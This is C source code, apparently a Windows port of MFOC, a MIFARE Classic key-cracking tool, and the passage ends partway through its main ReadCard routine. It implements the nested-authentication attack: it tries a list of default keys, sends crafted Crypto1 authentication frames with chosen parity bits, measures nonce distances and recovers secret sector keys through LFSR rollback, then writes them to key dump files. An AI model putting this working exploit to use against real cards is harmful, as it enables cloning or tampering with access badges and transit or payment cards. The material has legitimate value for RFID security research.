#pragma once
#include "mfoc.h"
#include <nfc/nfc.h>
#include <Windows.h>
#include <direct.h>
#include "crapto1.h"
#include "mifare.h"
#include "nfc-utils.h"

bool stopreadingcard = false;

long long unsigned int bytes_to_num(byte_t* src, uint32_t len);
int compar_int(const void * a, const void * b);
int compar_special_int(const void * a, const void * b);
uint32_t median(denonce d);
void mf_anticollision(nfc_device_desc_t *device, mftag *t, mfreader *r, void (*UpdateStatusMessage)(char *status));
void mf_configure(nfc_device_t* pdi);
int mf_enhanced_auth(int e_sector, int a_sector, mftag t, mfreader r, denonce *d, pKeys *pk, char mode, bool dumpKeysA, void (*UpdateStatusMessage)(char *status));
void mf_init(nfc_device_desc_t *device, mftag *t, mfreader *r, void (*UpdateStatusMessage)(char *status));
void mf_select_tag(nfc_device_t* pdi, nfc_target_info_t* ti, void (*UpdateStatusMessage)(char *status));
int trailer_block(uint32_t block);
void reset(nfc_device_desc_t *device, mftag *t, mfreader *r, void (*UpdateStatusMessage)(char *status));
int find_exploit_sector(mftag t, void (*UpdateStatusMessage)(char *status));
void num_to_bytes(uint64_t n, uint32_t len, byte_t* dest);
countKeys * uniqsort(uint64_t * possibleKeys, uint32_t size, void (*UpdateStatusMessage)(char *status));
void readSector(nfc_device_desc_t *device,nfc_device_t * pnd, mifare_sector* sector,nfc_target_info_t *t, bool onlyA, mftag *a, mfreader *r, void (*UpdateStatusMessage)(char *status));
uint8_t sectorToFirstBlock(uint8_t sector);
unsigned int numberOfBlocks(uint8_t sector);
bool read_mifare_ul_card (nfc_device_t *pnd, mifareul_tag *mtDump, void (*UpdateStatusMessage)(char *status));


//! Read mifare ultralight card
/** @param pnd The NFC Device information
 * @param mtDump Mifare ultralight tag information
 * @return true if the read succeeded
 */
bool read_mifare_ul_card (nfc_device_t *pnd, mifareul_tag *mtDump, void (*UpdateStatusMessage)(char *status)) {
	uint32_t uiBlocks = 0xF;
  uint32_t page;
  bool bFailure = false;
  uint32_t uiReadedPages = 0;
	mifare_param mp;
	char StatusBuffer[600];

  sprintf(StatusBuffer, "Reading %d pages |", uiBlocks + 1);
	UpdateStatusMessage(StatusBuffer);

  for (page = 0; page <= uiBlocks; page += 4) {
    // Try to read out the data block
    if (nfc_initiator_mifare_cmd (pnd, MC_READ, page, &mp)) {
      memcpy (mtDump->amb[page / 4].mbd.abtData, mp.mpd.abtData, 16);
    } else {
      bFailure = true;
      break;
    }
		sprintf(StatusBuffer, "%s%s", StatusBuffer, bFailure ? "xxxx":"....");
		uiReadedPages += bFailure ? 0 : 4;
  }
  sprintf(StatusBuffer, "Done, %d of %d pages readed.\n", uiReadedPages, uiBlocks + 1);
	UpdateStatusMessage(StatusBuffer);

  return (!bFailure);
}

//! Get the number of blocks in a sector
/** @param sector The sector where you want the number of blocks from
 * @return The number of blocks
 */
unsigned int numberOfBlocks(uint8_t sector){
	return sector<32 ? 4:16;
}

//! Convert a sector to the first block of a sector
/** @param sector The sector to convert
 * @return the block
 */
uint8_t sectorToFirstBlock(uint8_t sector) {
	return (sector <= 32) ? (sector * 4) : (32 * 4 + (16*(sector-32)));
}

//! Read a sector from a card
/** @param pnd NFC device information
 * @param sector Sector to verify
 * @param t The target info
 * @param onlyA Only use key A to read
 * @param a The tag anticollision info
 * @param r The reader handle
 */
void readSector(nfc_device_desc_t *device, nfc_device_t * pnd, mifare_sector* sector,nfc_target_info_t *t, bool onlyA, mftag *a, mfreader *r, void (*UpdateStatusMessage)(char *status)) {
	static mifare_param mp;
	char Buffer[150];
	uint8_t block = sectorToFirstBlock(sector->sector)+numberOfBlocks(sector->sector) - 1;
	memcpy(mp.mpa.abtKey,sector->KeyA, sizeof(sector->KeyA));
	memcpy(mp.mpa.abtUid,t->nai.abtUid,4);
	if (nfc_initiator_mifare_cmd(pnd, MC_AUTH_A, block, &mp)) {
		int i;
		for (i=numberOfBlocks(sector->sector)-1; i>=0; i--) {
			if (nfc_initiator_mifare_cmd(pnd, MC_READ, block, &mp)) {
				sprintf(Buffer, "Block %02d, type %c, key %012llx :", block, 'A', bytes_to_num(sector->KeyA, 6));
				UpdateStatusMessage(Buffer);
				memcpy(sector->Data[i],mp.mpd.abtData,16);
			} else {
				mf_configure(pnd);
				nfc_initiator_select_passive_target(pnd, NM_ISO14443A_106, NULL, 0, t);
				sprintf(Buffer, "Error Reading: Block %02d, type %c, key %012llx", block, 'A', bytes_to_num(sector->KeyA, 6));
				UpdateStatusMessage(Buffer);
				break;
			}
			block--;
		}
	} else {
		mf_configure(pnd);
		mf_anticollision(device, a, r, UpdateStatusMessage);
		if (stopreadingcard) return;
		memcpy(mp.mpa.abtKey,sector->KeyB, sizeof(sector->KeyB));
		memcpy(mp.mpa.abtUid,t->nai.abtUid,4);
		if (nfc_initiator_mifare_cmd(pnd, MC_AUTH_B, block, &mp)) {
			int i;
			for (i=numberOfBlocks(sector->sector)-1;i>=0;i--) {
				if (nfc_initiator_mifare_cmd(pnd, MC_READ, block, &mp)) {
					sprintf(Buffer, "Block %02d, type %c, key %012llx :", block, 'B', bytes_to_num(sector->KeyB, 6));
					UpdateStatusMessage(Buffer);
					memcpy(sector->Data[i],mp.mpd.abtData,16);
				} else {
					mf_configure(pnd);
					nfc_initiator_select_passive_target(pnd, NM_ISO14443A_106, NULL, 0, t);
					sprintf(Buffer, "Error Reading: Block %02d, type %c, key %012llx", block, 'B', bytes_to_num(sector->KeyB, 6));
					UpdateStatusMessage(Buffer);
					break;
				}
				block--;
			}
		} else {
			sprintf(Buffer, "Error Reading: Block %02d, type %c, key %012llx :", block, 'B', bytes_to_num(sector->KeyB, 6));
			UpdateStatusMessage(Buffer);
			mf_configure(pnd);
			nfc_initiator_select_passive_target(pnd, NM_ISO14443A_106, NULL, 0, t);
		}
	}
}

//! Compare countKeys structure
/** @param a First countkey
 * @param b Second countkey
 * @param b->count - a->count;
 */
int compar_special_int(const void * a, const void * b) {
	return (((countKeys *)b)->count - ((countKeys *)a)->count);
}

//! Order a list and put the number of occurences in the list
/** @param possibleKeys the unsorted list of keys
 * @param size The number of keys
 * @return The sorted list
 */
countKeys * uniqsort(uint64_t * possibleKeys, uint32_t size, void (*UpdateStatusMessage)(char *status)) {
	int i, j = 0;
	int count = 0;
	countKeys *our_counts;
	
	qsort(possibleKeys, size, sizeof (uint64_t), compar_int);
	
	our_counts = (countKeys *)calloc(size, sizeof(countKeys));
	if (NULL == our_counts) {
		UpdateStatusMessage("Memory allocation error for our_counts");
		stopreadingcard = TRUE;
		return NULL;
	}
	
	for (i = 0; i < size; i++) {
		if (possibleKeys[i+1] == possibleKeys[i]) { 
			count++;
		} else {
			our_counts[j].key = possibleKeys[i];
			our_counts[j].count = count;
			j++;
			count=0;
		}
	}

	qsort(our_counts, j, sizeof(countKeys), compar_special_int);
	return (our_counts);
}

//! Compare two integers for sorting
/** @param a First int
 * @param b Second int
 * @param b - a;
 */
int compar_int(const void * a, const void * b) {
	return (*(uint64_t*)b - *(uint64_t*)a);
}

//! Return the median value from the nonce distances array
/** @param d Revealed information about the nonce
 * @return The median of the received nonces
 */
uint32_t median(denonce d) {
	int middle = (int) d.num_distances / 2;
	qsort(d.distances, d.num_distances, sizeof(u_int32_t), compar_int);
	
	if (1 == (d.num_distances % 2)) {
		// Odd number of elements
		return d.distances[middle];
	} else {
		// Even number of elements, return the smaller value
		return (uint32_t) (d.distances[middle-1]);
	}
}

//! MiFare cracking, nested authentication, recover key, distance keys
/** @param e_sector Exploit sector (where the key is known from)
 * @param a_sector The sector to crack
 * @param t The mifare tag
 * @param r The mifare reader
 * @param d Revealed information about the nonce
 * @param pk Possible Keys
 * @param mode 'r' for recovery, 'd' for distance
 * @param dumpKeysA Crack key A
 * @return 0
 */
int mf_enhanced_auth(int e_sector, int a_sector, mftag t, mfreader r, denonce *d, pKeys *pk, char mode, bool dumpKeysA, void (*UpdateStatusMessage)(char *status)) {
	struct Crypto1State* pcs;
	struct Crypto1State* revstate;
	struct Crypto1State* revstate_start;

	uint64_t lfsr;
	
	// Possible key counter, just continue with a previous "session"
	uint32_t kcount = pk->size;
		
	byte_t Nr[4] = { 0x00,0x00,0x00,0x00 }; // Reader nonce
	byte_t Auth[4] = { 0x00, t.sectors[e_sector].trailer, 0x00, 0x00 };
	byte_t AuthEnc[4] = { 0x00, t.sectors[e_sector].trailer, 0x00, 0x00 };
	byte_t AuthEncPar[8] = { 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 };
	
	byte_t ArEnc[8] = { 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 };
	byte_t ArEncPar[8] = { 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 };
	
	byte_t Rx[MAX_FRAME_LEN]; // Tag response
	byte_t RxPar[MAX_FRAME_LEN]; // Tag response
	size_t RxLen;
	
	u_int32_t Nt, NtLast, NtProbe, NtEnc, Ks1;

	int i, m;
	
	// Prepare AUTH command
	Auth[0] = (t.sectors[e_sector].foundKeyA) ? 0x60 : 0x61;
	append_iso14443a_crc(Auth,2);
	
	// We need full control over the CRC
	if (!nfc_configure(r.pdi, NDO_HANDLE_CRC, false))  {
		nfc_perror (r.pdi, "nfc_configure");
		stopreadingcard = TRUE;
		return 0;
	}

	// Request plain tag-nonce

	if (!nfc_configure (r.pdi, NDO_EASY_FRAMING, false)) {
		nfc_perror (r.pdi, "nfc_configure");
		stopreadingcard = TRUE;
		return 0;
	}

	if (!nfc_initiator_transceive_bytes(r.pdi, Auth, 4, Rx, &RxLen)) {
		UpdateStatusMessage("Error while requesting plain tag-nonce.");
		stopreadingcard = TRUE;
		return 0;
	}

	if (!nfc_configure (r.pdi, NDO_EASY_FRAMING, true)) {
		nfc_perror (r.pdi, "nfc_configure");
		stopreadingcard = TRUE;
		return 0;
	}
	
	// Save the tag nonce (Nt)
	Nt = bytes_to_num(Rx, 4);
	
	// Init the cipher with key {0..47} bits
	if (t.sectors[e_sector].foundKeyA)
		pcs = crypto1_create(bytes_to_num(t.sectors[e_sector].KeyA, 6));
	else
		pcs = crypto1_create(bytes_to_num(t.sectors[e_sector].KeyB, 6));

	// Load (plain) uid^nt into the cipher {48..79} bits
	crypto1_word(pcs, bytes_to_num(Rx, 4) ^ t.uid, 0);
	
	// Generate (encrypted) nr+parity by loading it into the cipher
	for (i = 0; i < 4; i++) {
		// Load in, and encrypt the reader nonce (Nr)
		ArEnc[i] = crypto1_byte(pcs, Nr[i], 0) ^ Nr[i];
		ArEncPar[i] = filter(pcs->odd) ^ oddparity(Nr[i]);
	}
	// Skip 32 bits in the pseudo random generator
	Nt = prng_successor(Nt, 32);
	// Generate reader-answer from tag-nonce
	for (i = 4; i < 8; i++) {
		// Get the next random byte
		Nt = prng_successor(Nt, 8);
		// Encrypt the reader-answer (Nt' = suc2(Nt))
		ArEnc[i] = crypto1_byte(pcs, 0x00, 0) ^ (Nt&0xff);
		ArEncPar[i] = filter(pcs->odd) ^ oddparity(Nt);
	}
	
	// Finally we want to send arbitrary parity bits
	nfc_configure(r.pdi, NDO_HANDLE_PARITY, false);
	
	// Transmit reader-answer
	if ((!nfc_initiator_transceive_bits(r.pdi, ArEnc, 64, ArEncPar, Rx, &RxLen, RxPar)) || (32 != RxLen)) {
		UpdateStatusMessage("Reader-answer transfer error, exiting..");
		stopreadingcard = TRUE;
		return 0;
	}
	
	// Decrypt the tag answer and verify that suc3(Nt) is At
	Nt = prng_successor(Nt, 32);
	if (!((crypto1_word(pcs, 0x00, 0) ^ bytes_to_num(Rx, 4)) == (Nt&0xFFFFFFFF))) {
		UpdateStatusMessage("[At] is not Suc3(Nt), something is wrong, exiting..");
		stopreadingcard = TRUE;
		return 0;
	}
	
	// If we are in "Get Recovery" mode
	if ('r' == mode) {
		// Again, prepare the Auth command with MC_AUTH_A, recover the block and CRC
		Auth[0] = dumpKeysA ? 0x60 : 0x61;
		Auth[1] = a_sector; 
		append_iso14443a_crc(Auth,2);
		
		// Encryption of the Auth command, sending the Auth command
		for (i = 0; i < 4; i++) {
			AuthEnc[i] = crypto1_byte(pcs,0x00,0) ^ Auth[i];
			// Encrypt the parity bits with the 4 plaintext bytes
			AuthEncPar[i] = filter(pcs->odd) ^ oddparity(Auth[i]);
		}
		if (!nfc_initiator_transceive_bits(r.pdi, AuthEnc, 32, AuthEncPar,Rx, &RxLen, RxPar)) {
			UpdateStatusMessage("Error requesting encrypted tag-nonce.");
			stopreadingcard = TRUE;
			return 0;
		}

		// Save the encrypted nonce
		NtEnc = bytes_to_num(Rx, 4);
		
		// Parity validity check
		for (i = 0; i < 3; ++i)
			d->parity[i] = (oddparity(Rx[i]) != RxPar[i]);
			
	
		// Iterate over Nt-x, Nt+x
		// fprintf(stdout, "Iterate from %d to %d\n", d->median-TOLERANCE, d->median+TOLERANCE);
		NtProbe = prng_successor(Nt, d->median-d->tolerance);
		for (m = d->median-d->tolerance; m <= d->median+d->tolerance; m +=2) {
			
			// Try to recover the keystream1 
			Ks1 = NtEnc ^ NtProbe;
					
			// Skip this nonce after invalid 3b parity check
			revstate_start = NULL;
			//int valid_nonce(uint32_t Nt, uint32_t NtEnc, uint32_t Ks1, byte_t * parity) {
			if ((odd_parity((NtProbe >> 24) & 0xFF) == ((d->parity[0]) ^ odd_parity((NtEnc >> 24) & 0xFF) ^ BIT(Ks1,16))) & \
					(odd_parity((NtProbe >> 16) & 0xFF) == ((d->parity[1]) ^ odd_parity((NtEnc >> 16) & 0xFF) ^ BIT(Ks1,8))) & \
					(odd_parity((NtProbe >> 8) & 0xFF) == ((d->parity[2]) ^ odd_parity((NtEnc >> 8) & 0xFF) ^ BIT(Ks1,0)))) {
			//if (valid_nonce(NtProbe, NtEnc, Ks1, d->parity)) {
			// And finally recover the first 32 bits of the key
			revstate = lfsr_recovery32(Ks1, NtProbe ^ t.uid);
			if (NULL == revstate_start) 
				revstate_start = revstate;
			
			while ((revstate->odd != 0x0) || (revstate->even != 0x0)) {
				lfsr_rollback_word(revstate, NtProbe ^ t.uid, 0);
				crypto1_get_lfsr(revstate, &lfsr);
				// Allocate a new space for keys
				if (((kcount % MEM_CHUNK) == 0) || (kcount >= pk->size)) {
					pk->size += MEM_CHUNK;
					// fprintf(stdout, "New chunk by %d, sizeof %lu\n", kcount, pk->size * sizeof(uint64_t));
					pk->possibleKeys = (uint64_t *) realloc((void *)pk->possibleKeys, pk->size * sizeof(uint64_t));
					if (NULL == pk->possibleKeys) {
						UpdateStatusMessage("Memory allocation error for pk->possibleKeys."); 
						stopreadingcard = TRUE;
						return 0;
					}
				}
				pk->possibleKeys[kcount] = lfsr;
				kcount++;
				revstate++;
			}
			free(revstate_start);
			}
			NtProbe = prng_successor(NtProbe, 2);
		}
		// Truncate
		if (0 != kcount) {
			pk->size = --kcount;
			if (NULL == (pk->possibleKeys = (uint64_t *) realloc((void *)pk->possibleKeys, pk->size * sizeof(uint64_t)))) {
				UpdateStatusMessage("Memory allocation error for pk->possibleKeys."); 
				stopreadingcard = TRUE;
				return 0;
			}		
		}
	} // If we are in recovery mode

	// If we are in "Get Distances" mode
	else if ('d' == mode) {
		for (m = 0; m < d->num_distances; m++) {
			// Encrypt Auth command with the current keystream
			for (i = 0; i < 4; i++) {
				AuthEnc[i] = crypto1_byte(pcs,0x00,0) ^ Auth[i];
				// Encrypt the parity bits with the 4 plaintext bytes
				AuthEncPar[i] = filter(pcs->odd) ^ oddparity(Auth[i]);
			}

			// Sending the encrypted Auth command
			if (!nfc_initiator_transceive_bits(r.pdi, AuthEnc, 32, AuthEncPar,Rx, &RxLen, RxPar)) {
				UpdateStatusMessage("Error requesting encrypted tag-nonce.");
				stopreadingcard = TRUE;
				return 0;
			}

			// Decrypt the encrypted auth 
			if (t.sectors[e_sector].foundKeyA) {
				pcs = crypto1_create(bytes_to_num(t.sectors[e_sector].KeyA, 6));
			} else {
				pcs = crypto1_create(bytes_to_num(t.sectors[e_sector].KeyB, 6));
			}
			NtLast = bytes_to_num(Rx, 4) ^ crypto1_word(pcs, bytes_to_num(Rx, 4) ^ t.uid, 1); 
			
			// Save the determined nonces distance
			d->distances[m] = nonce_distance(Nt, NtLast);
			
			// Again, prepare and send {At}
			for (i = 0; i < 4; i++) {
				ArEnc[i] = crypto1_byte(pcs, Nr[i], 0) ^ Nr[i];
				ArEncPar[i] = filter(pcs->odd) ^ oddparity(Nr[i]);
			}
			Nt = prng_successor(NtLast, 32);
			for (i = 4; i < 8; i++) {
				Nt = prng_successor(Nt, 8);
				ArEnc[i] = crypto1_byte(pcs, 0x00, 0) ^ (Nt&0xFF);
				ArEncPar[i] = filter(pcs->odd) ^ oddparity(Nt);
			}
			nfc_configure(r.pdi,NDO_HANDLE_PARITY,false);
			if ((!nfc_initiator_transceive_bits(r.pdi, ArEnc, 64, ArEncPar, Rx, &RxLen, RxPar)) || (RxLen != 32)) {
				UpdateStatusMessage("Reader-answer transfer error, exiting..");
				stopreadingcard = TRUE;
				return 0;
			}
			Nt = prng_successor(Nt, 32);
			if (!((crypto1_word(pcs, 0x00, 0) ^ bytes_to_num(Rx, 4)) == (Nt&0xFFFFFFFF))) {
				UpdateStatusMessage("[At] is not Suc3(Nt), something is wrong, exiting..");
				stopreadingcard = TRUE;
				return 0;
			}
		} // Next auth probe
		
		// Find median from all distances
		d->median = median(*d);
		//fprintf(stdout, "Median: %05d\n", d->median);
	} // The end of Get Distances mode
	
	crypto1_destroy(pcs);
	return 0;
}

//! Convert a number to byte[]
/** @param n Number to convert
 * @param len Length of the number
 * @param dest Where to store the number as byteform
 */
void num_to_bytes(uint64_t n, uint32_t len, byte_t* dest) {
	while (len--) {
		dest[len] = (byte_t) n;
		n >>= 8;
	}
}
//! Return position of sector if it is encrypted with the default key otherwise exit..
/** @param t The tag information
 * @return The sector that has a key
 */
int find_exploit_sector(mftag t, void (*UpdateStatusMessage)(char *status)) {
	unsigned int i; 
	bool interesting = false;
	char buffer[50];
	
	for (i = 0; i < t.num_sectors; i++)
		if (!t.sectors[i].foundKeyA || !t.sectors[i].foundKeyB) {
			interesting = true;
			break;
		}
	
	if (!interesting) {
		UpdateStatusMessage("Status: We have all sectors encrypted with the default keys..");
		return -1;
	}

	for (i = 1; i < t.num_sectors; i++)
		if ((t.sectors[i].foundKeyA) || (t.sectors[i].foundKeyB)) {
			sprintf(buffer, "Statis: Using sector %02d as an exploit sector", i);
			UpdateStatusMessage(buffer);
			return i;
		}
	
	if ((t.sectors[0].foundKeyA) || (t.sectors[0].foundKeyB)) {
		sprintf(buffer, "Statis: Using sector %02d as an exploit sector", 0);
		UpdateStatusMessage(buffer);
		return 0;
	}

	UpdateStatusMessage("No sector encrypted with the default key has been found, exiting.");
	stopreadingcard = TRUE;
}

//! Reset the reader
/** @param t The mifare tag
 * @param r Handle to the reader
 */
void reset(nfc_device_desc_t *device, mftag *t, mfreader *r, void (*UpdateStatusMessage)(char *status)){
	UpdateStatusMessage("Status: Reconnecting to reader.");
	nfc_configure(r->pdi, NDO_HANDLE_CRC, true);
	nfc_configure(r->pdi, NDO_HANDLE_PARITY, true);
	nfc_disconnect(r->pdi);
	mf_init(device, t,r, UpdateStatusMessage);
	if (stopreadingcard) return;
	mf_configure(r->pdi);
	mf_select_tag(r->pdi, &t->ti, UpdateStatusMessage);
}

//! Mifare anticollision
/** @param t The mifare tag
 * @param r Handle to the reader
 */
void mf_anticollision(nfc_device_desc_t *device, mftag *t, mfreader *r, void (*UpdateStatusMessage)(char *status)) {
	if (!nfc_initiator_select_passive_target(r->pdi, NM_ISO14443A_106, NULL, 0, &t->ti))
		reset(device, t, r, UpdateStatusMessage);
}

//! Check if the given block is a trailer block
/** @param block The block to check
 * @return true if it's the trailer block
 */
int trailer_block(uint32_t block) {
	// Test if we are in the small or big sectors
	return (block < 128) ? ((block + 1) % 4 == 0) : ((block + 1) % 16 == 0); 
}

//! Converts a byte[] to an number
/** @param src The byte[] source
 * @param len Length of the byte array
 * @return The converted number
 */
long long unsigned int bytes_to_num(byte_t* src, uint32_t len) {
	uint64_t num = 0;
	while (len--) {
		num = (num << 8) | (*src);
		src++;
	}
	return num;
}


//! Select a mifare card
/** @param pdi The NFC Device information
 * @param ti Information about the card
 * @param UpdateStatusMessage a message for the user
 */
void mf_select_tag(nfc_device_t* pdi, nfc_target_info_t* ti, void (*UpdateStatusMessage)(char *status)) {
	// Poll for a ISO14443A (MIFARE) tag
	if (!nfc_initiator_select_passive_target(pdi,NM_ISO14443A_106,NULL,0,ti)) {
		UpdateStatusMessage("Status: !Error connecting to the MIFARE Classic tag.");
		nfc_disconnect(pdi);
		stopreadingcard = TRUE;
	}
}

//! Configure the mifare device
/** @param pdi The NFC Device information
 */
void mf_configure(nfc_device_t* pdi) {
	nfc_initiator_init(pdi);
	// Drop the field for a while, so can be reset
	nfc_configure(pdi,NDO_ACTIVATE_FIELD,false);

	// Let the reader only try once to find a tag
	nfc_configure(pdi,NDO_INFINITE_SELECT,false);
	// Configure the CRC and Parity settings
	nfc_configure(pdi,NDO_HANDLE_CRC,true);
	nfc_configure(pdi,NDO_HANDLE_PARITY,true);
	// Enable the field so more power consuming cards can power themselves up
	nfc_configure(pdi,NDO_ACTIVATE_FIELD,true);
}

//! Initialise the mifare reader, connect to the reader
/** @param t The mifare tag
 * @param r Handle to the reader
 * @param UpdateStatusMessage a message for the user
 */
void mf_init(nfc_device_desc_t *device, mftag *t, mfreader *r, void (*UpdateStatusMessage)(char *status)) {
	// Connect to the first NFC device
	r->pdi = nfc_connect(device);
	if (!r->pdi) {
		UpdateStatusMessage("Status: !Error connecting to the NFC reader. Make sure you closed all help programs");
		stopreadingcard = TRUE;
	}
}

void WriteCurrentKeys(char *keyDir, bool skipA, bool skipB, mftag		t) {
	char fileName[1000];
	FILE *keyFileA;
	FILE *keyFileB;
	byte_t keyBuffer[40][6];
	char found[40];
	int keyPlace;

	if (!skipA) {
		sprintf(fileName, "%s/keys/Ta%08x.dump", keyDir, t.uid);
		if (keyFileA = fopen(fileName, "wb")) {
			for (keyPlace = 0;keyPlace<t.num_sectors;keyPlace++) {
				found[keyPlace] = t.sectors[keyPlace].foundKeyA;
				memcpy(keyBuffer[keyPlace], t.sectors[keyPlace].KeyA,6);
			}
			fwrite(found, 1, t.num_sectors,keyFileA);
			fwrite(keyBuffer, 6, t.num_sectors,keyFileA);
			fclose(keyFileA);
		}
	}
	if (!skipB) {
		sprintf(fileName, "%s/keys/Tb%08x.dump", keyDir, t.uid);
		if (keyFileB = fopen(fileName, "wb")) {
			for(keyPlace = 0;keyPlace<t.num_sectors;keyPlace++) {
				found[keyPlace] = t.sectors[keyPlace].foundKeyB;
				memcpy(keyBuffer[keyPlace], t.sectors[keyPlace].KeyB, 6);
			}
			fwrite(found, 1, t.num_sectors,keyFileB);
			fwrite(keyBuffer, 6, t.num_sectors,keyFileB);
			fclose(keyFileB);
		}
	}
}

void ReadCurrentKeys(char *keyDir, bool skipA, bool skipB, mftag		t, void (*UpdateSectorStatus)(char, int, byte_t)) {
	char fileName[1000];
	FILE *keyFileA;
	byte_t keyBuffer[40][6];
	char found[40];
	int keyPlace;
	int j;

	if (!skipA) {
		sprintf(fileName, "%s/keys/Ta%08x.dump", keyDir, t.uid);
		if ((!skipA) && (keyFileA = fopen(fileName, "rb"))) {
			fread(found, 1, t.num_sectors, keyFileA);
			if (j = fread(keyBuffer, 6, t.num_sectors, keyFileA)) {
				int keyPlace;
				for (keyPlace = 0;keyPlace<j;keyPlace++) {
					t.sectors[keyPlace].foundKeyA = found[keyPlace];
					memcpy(t.sectors[keyPlace].KeyA, keyBuffer[keyPlace],6);
					if (found[keyPlace])
						UpdateSectorStatus('A', keyPlace, 2);
				}
			}
			fclose(keyFileA);
		}
	}
	if (!skipB) {
		sprintf(fileName, "%s/keys/Tb%08x.dump", keyDir, t.uid);
		if ((!skipB) && (keyFileA = fopen(fileName, "rb"))) {
			fread(found, 1, t.num_sectors, keyFileA);
			if (j = fread(keyBuffer, 6, t.num_sectors, keyFileA)) {
				int keyPlace;
				for (keyPlace = 0;keyPlace<j;keyPlace++) {
					t.sectors[keyPlace].foundKeyB = found[keyPlace];
					memcpy(t.sectors[keyPlace].KeyB, keyBuffer[keyPlace],6);
					if (found[keyPlace])
						UpdateSectorStatus('B', keyPlace, 2);
				}
			}
			fclose(keyFileA);
		}
	}
}

void DeleteTempKeys(char *keyDir, bool skipA, bool skipB, mftag		t) {
	char fileName[1000];
	if (!skipA) {
		sprintf(fileName, "%s/keys/Ta%08x.dump", keyDir, t.uid);
		DeleteFile(fileName);
	}
	if (!skipB) {
		sprintf(fileName, "%s/keys/Tb%08x.dump", keyDir, t.uid);
		DeleteFile(fileName);
	}
}

int ReadCard(nfc_device_desc_t *device, std::list<performance> *performanceData, int sets, char *keyDir, unsigned char *buffer, int buffersize, int skipToSector, bool keyA, bool keyB, void (*UpdateSectorStatus)(char, int, byte_t), void (*UpdateStatusMessage)(char *status), void (*SetCardInfo)(char *status)) {

	//Set all sectors to no information
	char StatusBuffer[600];
	int ch, k, n;
	int iFoundKeys = 0;
	unsigned int i, j, m, o;
	int key, block;
	int succeed = 1;
	char *data;

	// Exploit sector
	int e_sector; 
	int probes = DEFAULT_PROBES_NR;
	int tryKeys = 0;
		
	// By default, dump 'A' keys
	bool dumpKeysA = true;
	bool skip = false;
	bool keysFound = false;
	bool skipB = !keyB;
	bool skipA = !keyA;
	bool useKeyFile = true;
	bool foundAFile = false;
	bool foundBFile = false;
	
	stopreadingcard = false;

	char fileName[1000];
	FILE * keyFileA;
	FILE * keyFileB;
	byte_t keyBuffer[40][6];
	
	// Next default key specified as option (-k)
	byte_t * defKey = NULL; 
	
	// Array with default Mifare Classic keys
	byte_t defaultKeys[][6] = {
	{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}, // User defined key slot
	//{0x, 0x, 0x, 0x, 0x, 0x},

	{0xb5, 0xff, 0x67, 0xcb, 0xa9, 0x51},
	{0x00, 0x00, 0x00, 0x00, 0x00, 0x00},

	{0xff, 0xff, 0xff, 0xff, 0xff, 0xff},
	{0xa0, 0xa1, 0xa2, 0xa3, 0xa4, 0xa5},
	{0xb0, 0xb1, 0xb2, 0xb3, 0xb4, 0xb5},
	{0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
	{0x4d, 0x3a, 0x99, 0xc3, 0x51, 0xdd},
	{0x1a, 0x98, 0x2c, 0x7e, 0x45, 0x9a},
	{0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff}

	};
	
	mftag		t;
	mfreader	r;
	denonce		d = {NULL, 0, DEFAULT_DIST_NR, DEFAULT_TOLERANCE, {0x00, 0x00, 0x00}};

	// Pointers to possible keys
	pKeys		*pk;
	countKeys	*ck;
	
	// Pointer to already broken keys, except defaults
	bKeys		*bk;
	
	static mifare_param mp;
	static mifare_classic_tag mtDump;
	
	mifare_cmd mc;

	i=1;

	for (i = 0; i < 40; i++) {
		UpdateSectorStatus('A', i, 0);
		UpdateSectorStatus('B', i, 0);
	}

	
	// Initialize reader/tag structures
	mf_init(device, &t, &r, UpdateStatusMessage);
	if (stopreadingcard) return 0;
	// Configure reader settings
	mf_configure(r.pdi);
	if (stopreadingcard) { return 0;	}
	mf_select_tag(r.pdi, &t.ti, UpdateStatusMessage);
	if (stopreadingcard) { return 0;	}
	//Check if it's a mifare classic tag
	if (0 != (t.ti.nai.btSak & 0x08)) {

		// Save tag uid and info about block size (b4K)
		t.b4K = (t.ti.nai.abtAtqa[1] == 0x02);
		t.uid = (uint32_t) bytes_to_num(t.ti.nai.abtUid, 4);

		t.num_blocks = (t.b4K) ? 0xff : 0x3f;
		t.num_sectors = t.b4K ? NR_TRAILERS_4k : NR_TRAILERS_1k;
	
		t.sectors = (sector *) calloc(t.num_sectors, sizeof(sector));

		if (t.b4K && buffersize < 4096) {
			UpdateStatusMessage("Buffersize must be at least 4096 bytes");
			return 0;
		}
		else if (t.b4K && buffersize < 1024) {
			UpdateStatusMessage("Buffersize must be at least 1024 bytes");
			return 0;
		}


		if (NULL == t.sectors) {
			UpdateStatusMessage("Status: Error! Cannot allocate memory for t.sectors."); 
			return 0;
		}

		if (NULL == (pk = (pKeys *) malloc(sizeof(pKeys)))) {
			UpdateStatusMessage("Status: Error! Cannot allocate memory for pk."); 
			return 0;
		}

		if (NULL == (bk = (bKeys *) malloc(sizeof(bKeys)))) {
			UpdateStatusMessage("Status: Error! Cannot allocate memory for bk."); 
			return 0;
		} else { 
			bk->brokenKeys = NULL;
			bk->size = 0; 
		}
		
		d.distances = (uint32_t *) calloc(d.num_distances, sizeof(u_int32_t));
		if (NULL == d.distances) {
			UpdateStatusMessage("Status: Error! Cannot allocate memory for t.distances."); 
			return 0;
		}		
	
	
		// Initialize t.sectors, keys are not known yet
		for (i = 0; i < (t.num_sectors); ++i) {
			t.sectors[i].foundKeyA = t.sectors[i].foundKeyB = false;
		}
	
		sprintf(StatusBuffer,"Card: MIFARE Classic %cK, uid: %08x\n", (t.b4K ? '4' : '1'), t.uid);
		SetCardInfo(StatusBuffer);

		if (useKeyFile) {
			sprintf(fileName, "%s/keys/a%08x.dump", keyDir, t.uid);
			if ((!skipA) && (keyFileA = fopen(fileName, "rb"))) {
				foundAFile = true;
				UpdateStatusMessage("A-key file found.");
				if (t.num_sectors == fread(keyBuffer, 6, t.num_sectors, keyFileA)) {
					int keyPlace;
					for (keyPlace = 0;keyPlace<t.num_sectors;keyPlace++) {
						t.sectors[keyPlace].foundKeyA = true;
						memcpy(t.sectors[keyPlace].KeyA, keyBuffer[keyPlace],6);
						UpdateSectorStatus('A', keyPlace, 2);
					}
				}
				fclose(keyFileA);
			} else if (!skipA) {
				UpdateStatusMessage("Didn't find A-key file. Start cracking keys.\n");
			} else {
				foundAFile = true;;
			}

